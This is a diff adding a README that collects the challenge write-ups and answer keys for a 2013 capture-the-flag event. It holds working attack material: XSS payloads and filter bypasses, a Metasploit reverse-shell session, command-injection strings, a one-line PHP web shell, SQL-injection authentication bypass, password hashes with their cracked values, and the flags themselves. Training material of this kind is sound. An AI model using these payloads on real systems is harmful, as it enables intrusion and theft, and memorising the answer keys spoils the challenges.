@@ -1,0 +1,560 @@
+#All README files organized by Act and Scene#
+
+If a challenge is marked as NIY, it has not yet been integrated into the VM.
+
+ACT 1, SCENE 1
+
+JavaScript Password
+	DATE: January 16, 2013
+
+	AUTHOR: Karen Blakemore
+
+	CHALLENGE OVERVIEW: 
+	This is a simple login challenge.   Flag is captured by entering a correct username/
+	password pair.  Acceptable username/password pairs are listed in plaintext in the
+	JavaScript source.
+
+	DETAILED DESCRIPTION: HTML file with embedded JavaScript.
+
+	CATEGORIES: Authentication
+
+	FLAG: TBD
+
+	POINTS: TBD
+
+	RUN TIME: about 5 minutes
+
+	REQUIREMENTS: nothing special 
+
+	SOLUTION: 
+	Locate the html file for this challenge.  Peruse the file looking for an acceptable
+	username/password.
+
+	HINTS:  TBD
+
+Basic Stored XSS
+	DATE: 2/3/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: Basic Stored XSS
+
+	DETAILED DESCRIPTION: Stored XSS wherein the goal is for the student to display the 
+	hidden flag (session cookie)
+
+	CATEGORIES: Cross-Site Scripting
+
+	FLAG: 4 flags
+
+	POINTS: TBD
+
+	RUN TIMES: easy - 1-5 minutes medium - 1-5 minutes difficult - 3-15 minutes hard - 5-60 
+	minutes
+
+	REQUIREMENTS: Apache, PHP5
+
+	--Exercise 1 (EASY) -- Solution]-- Basic XSS attack to view document.cookie 1) review 
+	the hints and messages on the site 2) figure out where the key is likely stored (you 
+	won't see it in the source) 3) test some xss attacks alert(1); 4) view the 
+	document.cookie via xss alert(document.cookie); 5) an alert box will appear displaying 
+	the cookie value flag=176d7f3c46c3fcc440a4958e9a83bdd6
+
+	--Exercise 2 (MEDIUM) -- Solution]-- 1) review the hints and messages on the site 2) 
+	heed the hints, 'str_replace' eh? 3) attempt basic xss, realize 'script' is replaced w/ 
+	a null value 4) change the word script in some fashion OR use a different xss attack to 
+	view the cookie alert(document.cookie); #UPPERCASE CHARACTERS works #IMG XSS many other 
+	solutions... 6) sploit and grab flag... flag=1e6b269f289bc2074ce1ed5db4ed98fa
+
+	--Exercise 3 (DIFFICULT) -- Solution]-- 1) gettig trickier now, the developer is using 
+	htmlentities() to protect the parameter 2) how to bypass htmlentities() you ask??! 3) 
+	simple, don't use < or > or other similar symbols... .'onerror='alert(document.cookie) 
+	4) get cookie flag=9f338a0e53991b2e0ace72f8c2bd30f8
+
+	--Exercise 4 (HARD) -- Solution]-- 1) awww snap, it's about to get real... 2) this is a 
+	tricky one, but good to know for real-world pentesting as you can bypass most XSS 
+	filters this way... 3) since the vulnerable paramater is related to an object reference 
+	we can change the data type and run our own code 4) base64 encoding the payload is 
+	critical as html characters will be filtered out, plus it obfuscates the payload 5) 
+	craft a base64 encoded object payload and grab the session cookie data:text/
+	html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg== 6) haxx the 
+	planet :-) flag=5288a72784423b34beb12e25154e214c
+
+	HINTS: Hidden HTML element...
+
+Management
+	DATE: 1/25/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: Accessing common administrative and informational pages
+
+	DETAILED DESCRIPTION:
+	The goal of this test is to show the user that leaving administrative interfaces such
+	as phpmyadmin / cpanel easily accessible to the public are dangerous.
+
+	CATEGORIES: Configuration Management
+
+	FLAG: 2 flags so far
+
+	POINTS: TBD
+
+	RUN TIME: 1 minute
+
+	REQUIREMENTS: Apache, PHP5
+
+	SOLUTIONS:
+	All that needs to be done to solve this exercise is for the user to guess at the
+	directories and files. As of right now there is only a fake phpmyadmin interface and
+	phpinfo file, though we can definitely add more, such as fake drupal/joomla/wordpress
+ 	login page(s) or more.
+
+	They will most likely find this via directory brute-forcing (with ZAP / dirbuster) or
+	guessing the administrative interfaces. Once they access the page, they will be
+	presented with a key on the homepage as this is an extremely easy exercise.
+
+	--[phpmyadmin logon solution]--
+	1) view the phpmyadmin page
+	2) look up the default phpmyadmin login password
+	3) enter the credentials discovered form a quick google search
+	4) enter the creds
+		username: root
+		password:
+	5) capture the flag
+	6) profit
+
+	HINTS: TBD
+
+Code Execution
+	DATE: 1/26/2013
+
+	AUTHOR: Greg Foss - utilizing php-charts_v1.0 for vulnerable application
+
+	CHALLENGE OVERVIEW: Code Execution - using publicly disclosed exploit
+
+	DETAILED DESCRIPTION: Code Injection exercise, using a recently-discosed vulnerability
+	within php-charts_v1.0. The goal of this exercise is for the user to determine that the
+	application is vulnerable to code execution using all available methods. From there,
+	they should be able to exploit the application to obtain a shell on the system, where
+	they will need to search through directories and find the flag which resides in the
+	root of the php-charts_v1.0 directory.
+
+	CATEGORIES: Code Execution
+
+	FLAG: 1 flag
+
+	POINTS: TBD
+
+	RUN TIME: 30 minutes
+
+	REQUIREMENTS: Apache, PHP5, metasploit (for attacker)
+
+	--[Solution]-- This exercise is based on an open-source application (php charts v1.0)
+	that was found to be vulnerable to code executionn and a public exploit was released
+	January 21, 2013; a new and more real-world vulnerability that may be encountered
+	during a penetration test. The goal is for the user to investigate the app, including
+	the source-code and realize it is an open-source application that may be susceptible to
+	attack, extra-helpful if they find the hidden HTML hint...
+
+	Once they discover the OSVDB info within the HTML source or search for the tool online,
+	they can research the bug (http://www.exploit-db.com/exploits/24273/) or simply plug
+ 	this into metasploit and 'sploit away...
+
+	msf > search 89334 #SEARCH FOR OSVDB NUMBER FROM HIDDEN HTML HINT msf > use exploit
+	/unix/webapp/php_charts_exec #USE PHP_CHARTS EXPLOIT msf exploit(php_charts_exec) > set
+	RHOST [IPADDRESS] #SET RHOST msf exploit(php_charts_exec) > set TargetURI [...path...]/
+	php-charts_v1.0/ #SET PATH TO WEB APP msf exploit(php_charts_exec) > show options #GET 
+	READY...
+
+	Module options (exploit/unix/webapp/php_charts_exec):
+
+	Name Current Setting Required Description
+
+	Proxies no Use a proxy chain RHOST [IPADDRESS] yes The target address RPORT 80 yes 
+	The target port TARGETURI /php-charts_v1.0/ yes The path to the web application VHOST
+	no HTTP server virtual host
+
+	Exploit target:
+
+	Id Name
+
+	0 Automatic Targeting
+
+	msf exploit(php_charts_exec) > check
+
+	[*] [IPADDRESS]:80 - Sending check [+] The target is vulnerable.
+
+	msf exploit(php_charts_exec) > exploit
+
+	[*] Started reverse double handler [*] [IPADDRESS]:80 - Sending payload (688 bytes) [+]
+	 [IPADDRESS]:80 - Payload sent successfully [*] Accepted the first client connection...
+	 [*] Accepted the second client connection... [*] Command: echo ssrpbAnQIu4XmeGP; [*]
+	 Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading
+	 from socket B [*] B: "ssrpbAnQIu4XmeGP\r\n" [*] Matching... [*] A is input... [*]
+	 Command shell session 1 opened ([ATTACKER]:4444 -> [VICTIM]:33024) at 2013-01-26
+	 00:12:38 -0700
+
+	---HAXX AWAY--- ls ../ #SEARCH THROUGH THE DIRECTORY CONTENTS UNTIL DISCOVERING THE
+	 FLAG data docs gallery include index.php lib tmp wizard ze-flag-captain.txt 
+	cat ../ze-flag-captain.txt #VIEW THE FLAG flag=36d5529620f2cf0ee4c059c7559bcda8
+
+	HINTS: Hidden HTML element...
+
+Command Injection
+	DATE: 1/16/2013
+
+	AUTHOR: Greg Foss & Samuel Leathers
+
+	CHALLENGE OVERVIEW: Basic command injection exercises for vulnerable PHP code.
+
+	DETAILED DESCRIPTION: The goal of this test is to see if the user can submit commands
+	 used to find and view the keyfile. Since the file has a semi-random name it is fairly
+	 unlikely that they will find it by brute-forcing the directory.
+
+	Jails are extremely important for this exercise, so as to keep users from traversing
+	 the rest of the file system
+
+	CATEGORIES: Command Injection / PHP
+
+	FLAG: 2 flags so far
+
+	POINTS: TBD
+
+	RUN TIME: 10 minutes for three exercises
+
+	REQUIREMENTS: Apache, PHP5
+
+	SOLUTIONS: There are a few ways to solve this exercise. Basically all that needs to 
+	be done is the user needs to submit commands to both find and retrieve the keyfile.
+
+	--[Exercise 1 - Solution]-- 1) submit 'ls' to the query box 2) view the contents and
+	 find the name of the keyfile (00000x41414141.txt) 3) submit 'cat 00000x41414141.txt'
+	 to the input box 4) view and submit the flag (flag=176d7f3c46c3fcc440a4958e9a83bdd6)
+
+	--[Exercise 2 - Solution]-- 1) review the URI per instructions. 2) the last exercise
+	 should clue users in... 3) append the following to the URI to display folder contents:
+	 '?cmd=ls' 4) append the following to the URI to view the keyfile
+	 (2001010101xAD041423996.txt): '?cmd=cat%2001010101xAD041423996.txt' 5) view and submit
+	 the flag (flag=5744b14728d2b8d11715cc73964d58eb)
+
+	--[Exercise 3 - Solution]-- 1) you will notice that the text field is no longer
+	 editable... 2) there are two simple ways to pass this exercise, possibly more... 3)
+	 option 1 - edit the html and remove the 'readonly' and 'onfocus="this.blur();"'
+	 attributes 4) option 2 - use a proxy and modify the value before it is submitted 5)
+	 using one of the methods mentioned above, 'ls' the directory contents 6) now using the
+	 same method, cat the contents of the flagfile 'cat 4242424242oXXXX019301299999967.txt'
+	 7) view and submit the flag (flag=44c0c98e5c020278c5056cdc51a8560d)
+
+	--[Exercise 4 - Solution]-- 1) You will notice the text field takes a parameter of a
+	 site url to ping. 2) To get around this, you'll need to use a ; or some other trick.
+	 3) try the string google.com; ls
+
+	HINTS: TBD
+
+Hidden Form Field
+	AUTHOR: Greg Foss
+	
+	Basically a hidden form field that can be viewed when attempting to register. Not very difficult...
+	
+Basic Directory Indexing Example
+	DATE: 1/10/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: Basic Directory Indexing Example
+
+	DETAILED DESCRIPTION: The goal is for the student to browse through and gather 
+	keys from common directories.
+
+	CATEGORIES: Directory Indexing
+
+	FLAG: LOTS O FLAGS!
+
+	POINTS: TBD
+
+	RUN TIME: 2 minutes
+
+	REQUIREMENTS: Apache, Directory Indexing Enabled
+
+	SOLUTION: Um, visit the homepage and browse...
+
+	HINTS: NO HINTS 4 U!!
+	
+Basic Session Encoding Challenge
+	DATE: 2/17/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: Basic Session Encoding Challenge
+
+	DETAILED DESCRIPTION: This exercise demonstrates a few different methods of encoding 	
+	that web security folks may encounter during a penetration test. Not necessarily all at 
+	once and often developers refer to something like this as encryption, haha... This 
+	challenge will either be very straight-forward or rather difficult / frustrating 
+	depending on the contestant's experience with encoding in general. Those who 
+	successfully solve the challenge will demonstrate experience and skill in this area, 
+	which is why this challenge is rated at a higher difficulty and should award more 
+	points.
+
+	CATEGORIES: Session Management
+
+	FLAG: 1 flag
+
+	POINTS: TBD
+
+	RUN TIMES: 15-180 minutes
+
+	REQUIREMENTS: Apache, PHP5
+
+	--Session ID Encoding -- Solution]-- 1) Review the page, hints within HTML source, etc. 
+	2) Review the session token via proxy or by viewing the cookies 3) The session token 
+	may look like a flag, but this is merely one piece of the challenge... 4) Hints within 
+	the HTML show a conversation between the developer and admin, hinting at a script used 
+	to encode the key. 's3cr3t-3nc0d3r.txt' 5) View this file and began to create a php 
+	script on your system which you will use to decode the remaining pieces. See 
+	'solution.php' for example - DO NOT INCLUDE DURING COMPETITION 6) Now that you have the 
+	decoding script, grab the key from your cookie value 
+	key=3914adfcf6887913e3680dd11e1242f6467d213a 7) Run the decode function, make sure to 
+	remove the '
+	' or whitespace when copying the code echo decode			
+("o4f4h5q4v3c4z2p223r2q2r2q2a4x3p2r203t2w264u2047453n2u2z2n2648484z3w2c4q2b4w2q2p254z204x	25434m20343m2z2q2m27484k2r2u263r2f433049413n2x2z2n26474e4z3w2d4q2b4w2q2u2e4r28443z3a4y2p243s2q2x2y2y324p2z2p263432403c4x343u2m2w2s214f4f4z3x294q2d4p2q2t274r2d443z344q2z2t2z2u2m2r23494k2x223t22374q29434t2w2r2n2y2c4247454r21423b4k2v2p2d4r2b443z3b4r2p233r2q2w2r2v3","3914adfcf6887913e3680dd11e1242f6467d213a"); 8) 
+	You will now see the contents encoded using char(). Use JavaScript / online decoder to
+	 decode Char(99,51,108,117,100,68,48,122,77,68,104,120,77,50,57,119,99,84,78,118,78,68,69,48,78,72,78,119,99,68,73,51,99,84,81,52,98,106,90,118,79,71,52,51,77,122,86,118,78,81,61,61) 9) 
+	Next you will see the string is now base64 encoded - run the decode function echo 
+	base64_decode("c3ludD0zMDhxM29wcTNvNDE0NHNwcDI3cTQ4bjZvOG43MzVvNQ=="); 10) Next the 
+	string is now rot13 - run the decode function echo str_rot13
+	("synt=308q3opq3o4144spp27q48n6o8n735o5"); 11) Capture the flag 
+	flag=308d3bcd3b4144fcc27d48a6b8a735b5 12) Profit
+
+	HINTS: Hidden HTML element...
+
+ACT 1, SCENE 2
+
+Password Cracking
+	DATE: 1/19/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: sha512 w/ salt Password Cracking
+
+	DETAILED DESCRIPTION: The 'agent' has obtained both the /etc/passwd and /etc/shadow
+	 files from the target system. Their mission is to crack as many passwords as they can.
+	 The passwords are relatively easy so they should not take a very long time to crack,
+	 with the exception of 'admin' and 'n00b'. These ones have had special pastebin entries
+	 created, as long as the user decides to run a search on them.
+
+	CATEGORIES: Cryprography
+
+	FLAG: 8 potential flags The 'admin' and 'n00b' accounts should be of higher value than
+	 the others due to difficulty to crack or discover.
+
+	POINTS: TBD
+
+	RUN TIME: 15 minutes
+
+	REQUIREMENTS: Linux (preferred, though works on any os) John(JTR) / oclHashcat /
+	 similar, wordlist
+
+	--Exercise 1 -- Solution]-- Linux password cracking walkthrough 1) copy the contents of
+	 both passwd and shadow over to the system with password-cracking software loaded 2)
+	 unshadow the files using John ./unshadow passwd shadow 3) copy the contents of this
+	 command into a new file, name it something like 'unshadowed' (hint - as of right now
+	 this file is included in the exercise - (9999x441235.txt)) 4) run john on the file .
+	/john unshadowed 5) OR... Use oclHashcat or something similar. Though you will need to
+	 strip out just the usernames and passwords for this approach. admin:6$3RJXOyX
+	p$yw1R203tVhkEvhNjz0JhW9x9KMVcy/h
+	/YSZ15htRjjQZvFTqdkUstl0W.NYA0AWXmbokjMzwam9mhD4KP3olZ0 gary:$6$s/RRUvy
+	0$KMQIk8WDhv.TdIbutOKf0ei.uqR7zW//
+	rACRClNwNgE19jmrIxryULbzwW6csH7gt9JdHPfCFGnfTg8nrnR2N. larry:$6$iXOkBC0
+	M
+	$lqYCH.FF8xZXFZeJN2QXNkiSRyLPJ8YinB4SP.2wT/3QHfrNE4ybm2jJuQMmncnZ4ACimSL6AzurFrL3nxMGM/
+	 mary:$6$MFmDdoX
+	$0j942Mzueody1Jd.5cvBs46iJ7Otvxtgw275vX4BCEmXeoLkjBp3CaZakoLqFcXAj22BJJXmPUvU5fnoGR2Au0
+	 jerry:$6$p5.1nSa1$TkohIvyj3NnDbPZDwA8IBeRpPnCb7bVChVm
+	/BekwbtSJsIiUIXvddn5l451pxkP3RpsrcwLK1n1L6V.PYJpfM1 n00b:$6$aoEMlQ/
+	g$O9QsfgC7KsIs2o6QgQAeraI.QsKn4kPMSpaLeS/ZOGn6Lq.Nx/YwlSXOfIzR3KE35g6heV1M45nk
+	/eeexvQnS. hairy:$6$kU6ImZR
+	$R4h0Q.VpUjPOflSrohrCt8jUo5ZbsagGg.92EaNojScG22pdQDdc3cUiGGG0DUj1vQ0nsy2WSx039xxDBNfBV1
+	 fairy:$6$9pRPXIK2$5w5A85euRhk
+	/IeS2hX0pqYJlIwfH34CknZdqN9Xo1200HOEYwL7rid2XSdSshFudnDgoEOK/C5GRFq6OWZNLL/ 6) The
+	 cracker should be able to cruise through these relatively quickly, especially if usin
+	g a wordlist though that's not necessary. greg@bt:/pentest/passwords/john$ sudo john ~
+	/Desktop/9999x441235.txt Warning: detected hash type "sha512crypt", but the string is
+	 also recognized as "crypt" Use the "--format=crypt" option to force loading these as
+	 that type instead Loaded 8 password hashes with 8 different salts (sha512crypt
+	 [64/64]) guesses: 0 time: 0:00:00:03 13.03% (1) (ETA: Sat Jan 19 09:38:12 2013) c/s:
+	 182 trying: mary~ 123456 (fairy) changeme (larry) mary (gary) beast (hairy) christmas
+	 (mary) curl (jerry) (Took ~2 minutes on a physical backtrack server, will likely take
+	 much longer on laptops, especially VM's - PLEASE TEST) 7) The following two passwords
+	 will take longer to crack, so I have added pastebin entries for each. Hopefully the
+	 Googles will query these in time for the competition and the users will think to 
+	check there...admin -- http://pastebin.com/LMbQ8U7Z n00b -- http:/
+	/pastebin.com/8H9CTCAh 8) Passwords to be recovered in their entirety: admin:SN0W_FR0C
+	 n00b:P@ssword gary:mary larry:changeme mary:christmas jerry:curl hairy:beast
+	 fairy:123456
+
+	HINTS: One hidden hint within the HTML of the web page.
+
+Basic Session ID Brute-Forcing
+	DATE: 2/11/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: Basic Session ID Brute-Forcing
+
+	DETAILED DESCRIPTION: The goal of this exercise is to stress the importance of strong 	
+	session tokens by showing the user how a simple 4-number token can quickly be brute-
+	forced using a wordlist of every possible combination (10,000 variations) to disclose a 
+	secret token.
+
+	CATEGORIES: Session Management
+
+	FLAG: 1 flag
+
+	POINTS: TBD
+
+	RUN TIMES: 5-30 minutes
+
+	REQUIREMENTS: Apache, PHP5
+
+	--Session ID Brute-Forcing -- Solution]-- 1) Review the page, hints within HTML source,
+	 etc. 2) Review the session token via proxy or by viewing the cookies 3) Realize that
+	 the session token is set to only 4 characters... 4) Hmm, 4 characters? There's
+	 probably a wordlist out there somewhere! 5) Hit the Googles for a wordlist, many
+	 available. This one is good any easy to convert to usable format: 
+	http://pastebin.com/5FGXCctm I've included this wordlist within this directory to 
+	make for easy testing. 6) Download the wordlist, remove the useless info, import this
+	 into preferred brute-forcing / proxy tool 7) Make a request to the site, and review
+	 the HTTP headers: GET /SnowFROC2013/challenges/sessions/brute-force/session-brute
+	-force.php HTTP/1.1 Host: [ze-host] User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X
+	 10.8; rv:18.0) Gecko/20100101 Firefox/18.0 Accept: text/html,application/xhtml
+	+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding:
+	 gzip, deflate Referer: http://[ze-host]/SnowFROC2013/challenges/sessions/brute-force/ 	
+	Cookie: PHPSESSID=1234 Connection: keep-alive Cache-Control: max-age=0 8) Set the 
+	PHPSESSID value that you wish to brute-force, done like so in BurpSuite by utilizing §
+	 symbols like so: PHPSESSID=§1234§ 9) Run the attack, send all 10,000 requests to the
+	 site or stop when you've found the correct value (0069). 10) The correct value can be
+	 determined by a slight change in the response length All responses will be of length 		'1918' ONE will be '1955' This outlier response holds the flag... 11) capture the flag 	
+	flag=e01238754ea407a7d328e39950d305ad 12) profit :-)
+
+	HINTS: Hidden HTML element...
+
+File Upload Vulnerability
+	DATE: 2/16/2013
+
+	AUTHOR: Greg Foss
+
+	CHALLENGE OVERVIEW: File Upload Vulnerability
+
+	DETAILED DESCRIPTION: An exercise wherein the goal is for the user to upload a file 	
+	(most likely a PHP shell of some sort) and utilize this to access the flag which is 
+	hidden in the [exercise] directory.
+
+	CATEGORIES: Configuration Management
+
+	FLAG: 1 flag
+
+	POINTS: TBD
+
+	RUN TIMES: 1-10 minutes
+
+	REQUIREMENTS: Apache, PHP5, www-data has write permissions to /tmp/ and files/, php.ini 
+	contians (file_uploads = On)
+
+	--Exercise 1 (EASY) -- Solution]-- 1) review the site, test file upload feature 2) 
+	realize that you can upload any filetype 3) hmm...what is the best way to compromise a 
+	server via unrestricted file upload? a PHP shell of course! 4) write php shell, simple 
+	example below <?=$_GET[c]?> 5) upload your shell sh.php 6) access the file on the 
+	server upload/files/sh.php 7) haxx the box list file contents (upload/files/sh.php?
+	c=ls) list [exercise root] directory (upload/files/sh.php?c=ls%20../) view the keyfile 
+	contents (upload/files/sh.php?c=cat%20../abc123unmelolz.txt 	
+	flag=04ea7b64e95476dab75efd805230e4eb 8) profit
+
+	HINTS: Upload something bad, mmmmmkkkaaayyyyyy :-)
+
+ACT 2, SCENE1
+	AUTHOR: Tyler Bell
+	
+	Stego Challenge
+
+ACT 2, SCENE 2
+	AUTHOR: Greg Foss
+
+	1 - find the key in the ascii art twinkies
+
+	2 - pwn the login panel (bruteforce)
+		username = admin
+		password = Bigfoot
+
+	3 - reverse the decoded string
+
+	4 - remote file inclusion "index.php?file=flag.txt"
+	
+	5 - apache log analysis
+
+ACT 2, SCENE 2
+
+Easy SQL Injection
+	This challenge is meant to be the easiest of the 3. It is a simple authentication
+	 bypass using sqli. Once pulled from Github, and put into the document root for your
+	 web server, the login page can be accessed by browsing to http://localhost
+	/CTFDevelopment/sqlinjection/easy/loginform_easy.html.
+
+	Most people expect to exploit login forms through the username field, but this one 	
+	requires exploitation through the password field using: ' OR '1' = '
+
+ACT 3, SCENE 2
+
+Local Reverse Engineering
+	Revision Date:
+	12/15/2012
+
+	Author:
+	Carcariu5
+
+	General Instructions:
+	This program was intended to be a Windows PE and as such was built with Windows
+	libraries. To minimize compilation issues for members of the CTF Black team I will push
+	the executble up to Git, which should remove the need for others on the CTF "Black"
+	team from having the compile this code.
+
+	*** The competitors are not expected to compile from source, only dissasemble the
+	executable. ***
+
+	I successfully compiled this code in MS Visual Studio 2008. In the WIN32 project
+	Properties (right-click project in left panel and selecct Properties)->Configuration
+	Properties->C/C++->Command Line.
+
+	I created a console application and used the following properties for compilation:
+
+	/Od /D "WIN32" /D "_DEBUG" /D "_CONSOLE" /FD /EHsc /MDd /Fo"Debug\\" 
+	/Fd"Debug\vc90.pdb" /W3 /nologo /c /Wp64 /Zi /Gd /TC /errorReport:prompt
+
+	I have the binary built in case it is not possible for others to compile it (I would
+	not expect this to be an issue).
+
+	Description:
+
+	This challenge contains a substitution function. When the executable is disassembled,
+	it is quite easy to see the username and passwords that must be matched.
+	However, the user types in the username and password, the program will not dump the
+	flag. The flag will only be dumped if the user types in the correct
+	sequence of characters, which is the character just before those that must match. In
+	other words, the substitution function will increment the input by 1, so in order for
+	the strings to match the input to match the correct values, each character must be
+	typed as one ASCII value less than what it is supposed to match.
+
+	The username must be typed as 'abnnk' in order to match 'bcool' and the password must
+	be typed as 'RmnvEQNB1/02' to match 'SnowFROC2013'. Only when these strings are
+	entered as input
+	will the flag be dumped. The flag is actually a string resulting from an XOR operation
+	of the above strings and unsigned integer 55 (the flag is `ammQlmuDPMA0231). This
+	function was added to introduce additional obfuscation to make the binary appear 
+	more "busy".
+
+	Type the following to get the MD5 hash of the resulting string:
+	echo -n "[ammQlmuDPMA0231Z" | md5sum
+
+ACT 4, SCENES 1 - 2
+	AUTHOR: Samuel Leathers
+	
+	basically a bunch of flags hidden in interesting places throughout the OS.  :-)
